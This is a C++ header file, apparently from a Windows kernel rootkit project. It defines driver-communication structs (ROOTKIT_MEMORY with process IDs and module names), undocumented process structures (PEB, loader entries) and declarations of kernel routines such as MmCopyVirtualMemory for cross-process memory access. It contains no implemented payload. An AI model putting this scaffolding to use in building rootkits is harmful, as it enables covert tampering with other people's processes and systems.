typedef struct _RKSYSTEM_INFORMATION_CLASS {
	SYSTEM_INFORMATION_CLASS InfoType;
	ULONG InfoSize;
	ROOTKIT_STATUS ReturnStatus;
	PVOID PoolBuffer;
} RKSYSTEM_INFORMATION_CLASS, * PRKSYSTEM_INFORMATION_CLASS;


// Struct for passing string data -
typedef struct _STRING_DATA {
	const char* String;
	SIZE_T StrLen;
} STRING_DATA, * PSTRING_DATA;


/*
============
MAIN STRUCT:
============
*/


typedef struct _ROOTKIT_MEMORY {  // Used for communicating with the KM driver
	NTSTATUS Status;  // gets filled by the driver when the operation ends
	ROOTKIT_STATUS StatusCode;  // explains what the status means and why it is what it is
	ROOTKIT_OPERATION Operation;  // what operation to do (by defines)
	PVOID Buffer;  // buffer address (used for example in inputs)
	PVOID Out;  // pointer in memory to the output of the memory function
	ULONG64 Size; // size of memory chunk
	ULONG64 MainPID; // process that works on the memory
	ULONG64 SemiPID;  // (if the operation requests for reading) what is the PID of the destination process?
	ULONG64 MedPID;  // If needed, provide medium process PID
	const char* MdlName;  // (if the operation requests for a module base) what is the name of the module?
	const char* DstMdlName;  // (if the operation requests for a module base) what is the name of the module?
	ROOTKIT_UNEXERR Unexpected;  // data about an unexpected error that happened during the operation, is not relevant to driver
	BOOL IsFlexible;  // specifies if operations can be flexible
	PVOID Reserved;  // used for extra parameters needed to function
}ROOTKIT_MEMORY;

/*
======================================
STRUCTS FOR SPECIFIC USAGE (NOT ALOT):
======================================
*/


// Struct used for return of request system info (level one return type) -
typedef struct _RKSYSTEM_INFORET {
	ULONG64 BufferSize;
	PVOID Buffer;
} RKSYSTEM_INFORET;

/*
================================================
DEPENDENCIES OF IMPLEMENTATION / FUNCTION USAGE:
================================================
*/


typedef NTSTATUS(*QUERY_INFO_PROCESS) (
	__in HANDLE ProcessHandle,
	__in PROCESSINFOCLASS ProcessInformationClass,
	__out_bcount(ProcessInformationLength) PVOID ProcessInformation,
	__in ULONG ProcessInformationLength,
	__out_opt PULONG ReturnLength
	);


// data about an about-to-run/running usermode process (not used currently) -
typedef struct _RTL_USER_PROCESS_PARAMETERS {
	BYTE Reserved1[16];
	PVOID Reserved2[10];
	UNICODE_STRING ImagePathName;
	UNICODE_STRING CommandLine;
} RTL_USER_PROCESS_PARAMETERS, * PRTL_USER_PROCESS_PARAMETERS;


// the Process Environment Block loading data (data about used DLLs and other info for the loader, used in requests.cpp::GetModuleBase64bit and in _PEB struct) -
typedef struct _PEB_LDR_DATA {
	ULONG Length;
	BOOLEAN Initialized;
	PVOID SsHandle;
	LIST_ENTRY ModuleListLoadOrder;
	LIST_ENTRY ModuleListMemoryOrder;
	LIST_ENTRY ModuleListInitOrder;
} PEB_LDR_DATA, * PPEB_LDR_DATA;


// same as _PEB_LDR_DATA but for processes running on 32bit architecture (not used currently) -
typedef struct _PEB_LDR_DATA32
{
	ULONG Length;
	UCHAR Initialized;
	ULONG SsHandle;
	LIST_ENTRY32 InLoadOrderModuleList;
	LIST_ENTRY32 InMemoryOrderModuleList;
	LIST_ENTRY32 InInitializationOrderModuleList;
} PEB_LDR_DATA32, * PPEB_LDR_DATA32;


typedef void(__stdcall* PPS_POST_PROCESS_INIT_ROUTINE)(void); // not exported, used in _PEB structure


// data about the Process Environment Block of a specific process (includes important data about a running process, used in requests.cpp::GetModuleBase64bit) -
typedef struct _PEB {
	BYTE Reserved1[2];
	BYTE BeingDebugged;
	BYTE Reserved2[1];
	PVOID Reserved3[2];
	PPEB_LDR_DATA Ldr;
	PRTL_USER_PROCESS_PARAMETERS ProcessParameters;
	PVOID Reserved4[3];
	PVOID AtlThunkSListPtr;
	PVOID Reserved5;
	ULONG Reserved6;
	PVOID Reserved7;
	ULONG Reserved8;
	ULONG AtlThunkSListPtr32;
	PVOID Reserved9[45];
	BYTE Reserved10[96];
	PPS_POST_PROCESS_INIT_ROUTINE PostProcessInitRoutine;
	BYTE Reserved11[128];
	PVOID Reserved12[1];
	ULONG SessionId;
} PEB, * PPEB;


// same as _PEB but for 32bit architecture (not currently used) -
typedef struct _PEB32
{
	UCHAR InheritedAddressSpace;
	UCHAR ReadImageFileExecOptions;
	UCHAR BeingDebugged;
	UCHAR BitField;
	ULONG Mutant;
	ULONG ImageBaseAddress;
	ULONG Ldr;
	ULONG ProcessParameters;
	ULONG SubSystemData;
	ULONG ProcessHeap;
	ULONG FastPebLock;
	ULONG AtlThunkSListPtr;
	ULONG IFEOKey;
	ULONG CrossProcessFlags;
	ULONG UserSharedInfoPtr;
	ULONG SystemReserved;
	ULONG AtlThunkSListPtr32;
	ULONG ApiSetMap;
} PEB32, * PPEB32;


// data about a specific module inside the loaded module (DLL) list of a specific process, appears as a part of a linked list somewhere in _PEB_LDR_DATA -
typedef struct _LDR_DATA_TABLE_ENTRY {
	LIST_ENTRY InLoadOrderModuleList;
	LIST_ENTRY InMemoryOrderModuleList;
	LIST_ENTRY InInitializationOrderModuleList;
	PVOID DllBase;
	PVOID EntryPoint;
	ULONG SizeOfImage;  // in bytes
	UNICODE_STRING FullDllName;
	UNICODE_STRING BaseDllName;
	ULONG Flags;  // LDR_*
	USHORT LoadCount;
	USHORT TlsIndex;
	LIST_ENTRY HashLinks;
	PVOID SectionPointer;
	ULONG CheckSum;
	ULONG TimeDateStamp;
	//    PVOID			LoadedImports;
	//    // seems they are exist only on XP !!! PVOID
	//    EntryPointActivationContext;	// -same-
} LDR_DATA_TABLE_ENTRY, * PLDR_DATA_TABLE_ENTRY;


// Protect a chunk of virtual memory -
extern "C" __declspec(dllimport) NTSTATUS NTAPI ZwProtectVirtualMemory
(
	HANDLE ProcessHandle,
	PVOID * BaseAddress,
	PULONG ProtectSize,
	ULONG NewProtect,
	PULONG OldProtect
);


// Copy virtual memory from one process into another process (can also be used in KM with PeGetCurrentProcess as the PEPROCESS) -
extern "C" NTSTATUS NTAPI MmCopyVirtualMemory
(
	PEPROCESS SourceProcess,
	PVOID SourceAddress,
	PEPROCESS TargetProcess,
	PVOID TargetAddress,
	SIZE_T BufferSize,
	KPROCESSOR_MODE PreviousMode,
	PSIZE_T ReturnSize
);


// Find a routine (function) from a module (dll, sys...) with the routine's name -
extern "C" NTKERNELAPI PVOID NTAPI RtlFindExportedRoutineByName(_In_ PVOID ImageBase, _In_ PCCH RoutineName);

// Get information about the system on a specific topic (InfoClass) -
extern "C" NTSTATUS ZwQuerySystemInformation(ULONG InfoClass, PVOID Buffer, ULONG Length, PULONG ReturnLength);

// Get the PEB of a process -
extern "C" NTKERNELAPI PPEB PsGetProcessPeb(IN PEPROCESS Process);